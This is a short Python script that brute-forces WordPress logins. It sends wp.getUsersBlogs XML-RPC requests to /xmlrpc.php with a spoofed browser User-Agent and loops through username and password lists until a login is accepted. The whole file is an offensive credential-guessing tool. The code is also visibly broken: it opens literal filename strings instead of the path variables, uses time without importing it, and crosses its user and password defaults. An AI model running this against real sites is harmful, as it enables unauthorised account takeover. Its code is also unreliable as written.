import requests

url = "127.0.0.1" #Change this.
user_file_path = None
pass_file_path = "users.txt"
user = ["admin"]
passw = ["admin"]

path = "/xmlrpc.php"

final_url = url+path;

headers = {
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate, br",
	"Connection": "close",
	"Upgrade-Insecure-Requests": "1"
}


def bruteforce():
	USER = ''
	PASS = ''

	if user_file_path is not None:
		with open('user_file_path') as f:
			USER = f.readlines()
		
		for	ident, value in enumerate(USER):
			USER[ident] = value.replace('\n', '')
	else:
		PASS = passw
	if pass_file_path is not None:
		with open('pass_file_path') as f:
			PASS = f.readlines()
		
		for	ident, value in enumerate(PASS):
			PASS[ident] = value.replace('\n', '')
	else:
		USER = user;

	for us in USER:
		for pas in PASS:
			time.sleep(0.3)
			print(f"Trying name {us} and pass {pas}")

			xml_payload = f"""<?xml version="1.0" encoding="utf-8"?>
				 <methodCall> 
					<methodName>	wp.getUsersBlogs	</methodName> 
					<params> 
						<param><value>{us}</value></param> 
						<param><value>{pas}</value></param> 
					</params> 
				</methodCall>"""



			response = requests.post(final_url, headers=headers, data=xml_payload)
			response_payload = response.text
			
			if "Incorrect username or password." in response_payload:
				continue
			
			return us, pas
